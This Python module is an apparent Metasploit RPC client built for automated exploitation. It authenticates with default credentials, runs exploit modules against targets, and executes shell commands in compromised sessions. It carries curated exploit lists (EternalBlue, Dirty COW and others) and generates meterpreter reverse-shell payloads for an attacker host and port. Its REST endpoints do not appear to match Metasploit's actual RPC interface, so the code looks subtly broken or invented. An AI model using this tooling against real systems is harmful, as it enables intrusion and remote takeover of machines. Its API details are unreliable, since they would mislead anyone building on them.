"""
Metasploit RPC integration module
Communicate with Metasploit for advanced exploitation
"""

import requests
import json
import time
from typing import Dict, List, Optional
from dataclasses import dataclass


@dataclass
class MsfExploit:
    name: str
    type: str
    rank: str
    cve: str
    target: str
    payload: str
    success: bool
    output: str = ""


class MetasploitRPC:
    """Metasploit RPC client"""

    def __init__(self, host: str = "localhost", port: int = 55553, token: str = ""):
        self.host = host
        self.port = port
        self.token = token
        self.url = f"http://{host}:{port}/api/1"
        self.session_id = None

    def auth(self, user: str = "msf", password: str = "msf") -> bool:
        """Authenticate with Metasploit"""
        try:
            data = {"username": user, "password": password}
            response = requests.post(f"{self.url}/auth/login", json=data, timeout=5)
            if response.status_code == 200:
                self.token = response.json().get("token", "")
                return True
        except Exception as e:
            print(f"Auth error: {e}")
        return False

    def list_exploits(self) -> List[Dict]:
        """List available exploits"""
        exploits = []
        try:
            headers = {"Authorization": f"Bearer {self.token}"}
            response = requests.get(f"{self.url}/modules/exploits", headers=headers, timeout=10)
            if response.status_code == 200:
                exploits = response.json().get("modules", [])
        except Exception as e:
            print(f"List exploits error: {e}")
        return exploits

    def search_exploits(self, keyword: str) -> List[Dict]:
        """Search for exploits by keyword"""
        try:
            headers = {"Authorization": f"Bearer {self.token}"}
            params = {"search": keyword}
            response = requests.get(f"{self.url}/modules/exploits/search", 
                                  headers=headers, params=params, timeout=10)
            if response.status_code == 200:
                return response.json().get("results", [])
        except Exception as e:
            print(f"Search error: {e}")
        return []

    def create_session(self) -> int:
        """Create new Metasploit session"""
        try:
            headers = {"Authorization": f"Bearer {self.token}"}
            response = requests.post(f"{self.url}/sessions/create", 
                                    headers=headers, timeout=5)
            if response.status_code == 200:
                self.session_id = response.json().get("id", 0)
                return self.session_id
        except Exception as e:
            print(f"Session creation error: {e}")
        return 0

    def run_exploit(self, exploit_name: str, target: str, payload: str, 
                   options: Dict = None) -> MsfExploit:
        """Run an exploit module"""
        try:
            headers = {"Authorization": f"Bearer {self.token}"}
            
            data = {
                "module": exploit_name,
                "target": target,
                "payload": payload,
                "options": options or {}
            }
            
            response = requests.post(f"{self.url}/modules/run",
                                    headers=headers, json=data, timeout=30)
            
            if response.status_code == 200:
                result = response.json()
                return MsfExploit(
                    name=exploit_name,
                    type="exploit",
                    rank="excellent",
                    cve="",
                    target=target,
                    payload=payload,
                    success=result.get("success", False),
                    output=result.get("output", "")
                )
        except Exception as e:
            print(f"Exploit execution error: {e}")

        return MsfExploit(
            name=exploit_name,
            type="exploit",
            rank="unknown",
            cve="",
            target=target,
            payload=payload,
            success=False,
            output="Exploitation failed"
        )

    def get_sessions(self) -> List[Dict]:
        """Get active sessions"""
        try:
            headers = {"Authorization": f"Bearer {self.token}"}
            response = requests.get(f"{self.url}/sessions", headers=headers, timeout=5)
            if response.status_code == 200:
                return response.json().get("sessions", [])
        except Exception as e:
            print(f"Get sessions error: {e}")
        return []

    def shell_command(self, session_id: int, command: str) -> str:
        """Execute command in session"""
        try:
            headers = {"Authorization": f"Bearer {self.token}"}
            data = {"command": command}
            response = requests.post(f"{self.url}/sessions/{session_id}/shell_exec",
                                    headers=headers, json=data, timeout=10)
            if response.status_code == 200:
                return response.json().get("output", "")
        except Exception as e:
            print(f"Shell command error: {e}")
        return ""

    def get_session_type(self, session_id: int) -> str:
        """Get session type (meterpreter, shell, etc.)"""
        try:
            sessions = self.get_sessions()
            for session in sessions:
                if session.get("id") == session_id:
                    return session.get("type", "unknown")
        except Exception:
            pass
        return "unknown"

    # Metasploit exploit profiles
    COMMON_EXPLOITS = {
        "windows": [
            "exploit/windows/smb/ms17_010_eternalblue",
            "exploit/windows/smb/ms08_067_netapi",
            "exploit/windows/fileformat/adobe_flash_cve_2015_5122",
        ],
        "linux": [
            "exploit/linux/kernel/cve_2016_5195",
            "exploit/linux/fileformat/libreoffice_macro",
        ],
        "php": [
            "exploit/unix/php/php_eval",
        ],
        "java": [
            "exploit/multi/misc/java_jdwp_shellifier",
        ],
    }

    def get_recommended_exploits(self, os_type: str) -> List[str]:
        """Get recommended exploits for OS"""
        return self.COMMON_EXPLOITS.get(os_type.lower(), [])


class MsfPayloadGenerator:
    """Generate Metasploit payloads"""

    PAYLOADS = {
        "windows": [
            "windows/meterpreter/reverse_tcp",
            "windows/shell/reverse_tcp",
            "windows/meterpreter/reverse_https",
        ],
        "linux": [
            "linux/x86/meterpreter/reverse_tcp",
            "linux/x86/shell/reverse_tcp",
        ],
        "php": [
            "php/meterpreter/reverse_tcp",
        ],
        "python": [
            "python/meterpreter/reverse_tcp",
        ],
    }

    def __init__(self):
        pass

    def generate_payload(self, platform: str, lhost: str, lport: int) -> Dict:
        """Generate Metasploit payload"""
        if platform not in self.PAYLOADS:
            platform = "windows"

        payload_template = self.PAYLOADS[platform][0]

        return {
            "payload": payload_template,
            "options": {
                "LHOST": lhost,
                "LPORT": lport,
                "FORMAT": "exe" if platform == "windows" else "elf",
            }
        }

    def get_available_payloads(self, platform: str) -> List[str]:
        """Get available payloads for platform"""
        return self.PAYLOADS.get(platform, [])
